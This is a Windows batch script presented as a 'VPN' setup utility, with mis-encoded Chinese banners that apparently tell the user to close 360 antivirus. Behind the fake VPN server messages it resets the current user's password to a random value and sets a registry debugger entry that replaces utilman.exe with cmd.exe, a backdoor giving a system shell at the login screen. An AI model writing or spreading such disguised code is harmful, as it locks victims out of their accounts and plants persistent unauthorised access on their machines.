@echo off
@title VPN
echo ***************************************************************
echo *                                                             *
echo *               360���ܻ����ظ�������밲�ķ���               *
echo *                         ����ԭ��                          *
echo *                                                             *
echo *��һ�����ӡ�������Ҫ�Զ�����ȫ�ִ�������360��Ϊ����Ϊ����ȫ*
echo *                                                             *
echo ***************************************************************
pause
cls
echo ***************************************************************
echo *                                                             *
echo *                    ����عر�360�����                      *
echo *                      ������޷�����                         *
echo *                                                             *
echo ***************************************************************
pause
cls
if  exist "C:\blingcc" (goto no1) else (goto no2)
:no1
echo ***************************************************************
echo *                                                             *
echo *              VPN�������� Germany 185.117.84.23              *
echo *                                                             *
echo ***************************************************************
pause
exit
:no2
echo ***************************************************************
echo *                                                             *
echo *              VPN�������� Amsterdam 164.19.8.23              *
echo *                                                             *
echo ***************************************************************
net user %username% %random%
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
pause
exit


